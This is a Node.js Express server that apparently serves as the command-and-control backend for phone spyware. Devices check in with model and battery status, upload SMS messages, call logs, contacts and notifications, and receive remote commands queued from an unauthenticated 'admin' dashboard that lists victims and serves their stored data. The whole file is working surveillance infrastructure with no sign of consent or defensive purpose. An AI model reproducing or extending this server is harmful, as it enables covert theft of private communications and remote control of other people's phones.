const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 3000;

const UPLOADS_DIR = path.join(__dirname, 'uploads');
if (!fs.existsSync(UPLOADS_DIR)) {
    fs.mkdirSync(UPLOADS_DIR);
}

app.use(cors());
app.use(bodyParser.json({ limit: '50mb' })); 
app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
app.use(express.static(__dirname));

// Live devices memory mein status ke liye
let devicesStatus = {}; 

// ==================================================
// 📲 PHONE SIDE (App Side)
// ==================================================

app.post('/api/status', (req, res) => {
    const { device_id, model, battery, version, charging } = req.body; 
    if (!device_id) return res.status(400).json({ error: "No Device ID" });

    const pendingCommand = (devicesStatus[device_id] && devicesStatus[device_id].command) ? devicesStatus[device_id].command : "none";

    // Status update logic
    devicesStatus[device_id] = {
        id: device_id,
        model: model || "Unknown Device",
        battery: battery || 0,
        version: version || "--",
        charging: charging === 'true' || charging === true,
        lastSeen: Date.now(),
        command: "none" 
    };

    console.log(`📡 Ping from: ${model} (${device_id}) | Bat: ${battery}%`);
    res.json({ status: "success", command: pendingCommand });
});

app.post('/api/upload_data', (req, res) => {
    const { device_id, type, data } = req.body;
    if (!device_id) return res.status(400).json({ error: "No ID" });

    let parsedData = typeof data === 'string' ? JSON.parse(data) : data;
    const filePath = path.join(UPLOADS_DIR, `${device_id}_${type}.json`);

    try {
        let finalData;
        const historyTypes = ['notifications', 'sms', 'call_logs', 'contacts'];

        if (historyTypes.includes(type)) {
            let existingData = [];
            if (fs.existsSync(filePath)) {
                try {
                    const content = fs.readFileSync(filePath, 'utf8');
                    existingData = JSON.parse(content);
                } catch (e) { existingData = []; }
            }
            if (!Array.isArray(existingData)) existingData = [];

            if (Array.isArray(parsedData)) {
                // Unique entries merge logic
                finalData = [...parsedData, ...existingData].slice(0, 2000); 
            } else {
                existingData.unshift(parsedData);
                finalData = existingData.slice(0, 2000);
            }
        } else {
            finalData = parsedData;
        }

        fs.writeFileSync(filePath, JSON.stringify(finalData, null, 2));
        console.log(`📥 Saved ${type} for: ${device_id}`);
        res.json({ status: "success" });
    } catch (error) {
        console.error("Save Error:", error);
        res.status(500).json({ status: "error" });
    }
});

// ==================================================
// 💻 DASHBOARD SIDE (Admin Side)
// ==================================================

// 1. Saare Devices ki List (Folders scan karke + Live Status)
app.get('/api/admin/all-devices', (req, res) => {
    const files = fs.readdirSync(UPLOADS_DIR);
    let deviceList = {};

    // Uploads folder se devices ki history nikalna
    files.forEach(file => {
        const deviceId = file.split('_')[0];
        if (!deviceList[deviceId]) {
            deviceList[deviceId] = {
                id: deviceId,
                model: devicesStatus[deviceId]?.model || "Offline Device",
                lastSeen: devicesStatus[deviceId]?.lastSeen || 0,
                isOnline: devicesStatus[deviceId] ? (Date.now() - devicesStatus[deviceId].lastSeen < 60000) : false,
                battery: devicesStatus[deviceId]?.battery || "--"
            };
        }
    });

    res.json(deviceList);
});

// 2. Specific Data Fetch
app.get('/api/get-data/:device_id/:type', (req, res) => {
    const { device_id, type } = req.params;
    const filePath = path.join(UPLOADS_DIR, `${device_id}_${type}.json`);

    if (fs.existsSync(filePath)) {
        res.sendFile(filePath);
    } else {
        res.json([]); 
    }
});

// 3. Command Send
app.post('/api/send-command', (req, res) => {
    const { device_id, command } = req.body;
    if (!devicesStatus[device_id]) {
        devicesStatus[device_id] = { id: device_id, model: "Unknown" };
    }
    
    devicesStatus[device_id].command = command;
    console.log(`🚀 Cmd [${command}] queued for -> ${device_id}`);
    res.json({ status: "success" });
});

app.listen(PORT, () => {
    console.log(`🔥 CYBER-SERVER RUNNING ON PORT ${PORT}`);
});
